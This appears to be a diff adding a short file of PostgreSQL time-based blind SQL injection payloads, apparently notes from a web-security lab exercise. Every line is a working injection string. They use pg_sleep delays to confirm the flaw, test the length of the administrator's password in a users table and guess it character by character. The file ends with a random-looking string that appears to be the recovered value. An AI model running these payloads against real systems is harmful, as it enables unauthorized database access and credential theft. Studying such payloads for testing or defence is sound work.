@@ -1,0 +1,10 @@
+' || pg_sleep(10)-- -
+
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- -
+
+' || (select case when (username='administrator' and LENGTH(password)>10) then pg_sleep(10) else pg_sleep(-1) end from users)-- -
+
+' || (select case when (username='administrator' and substr(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)-- -
+
+
+tibfiohgxjnpsrzsvvg2
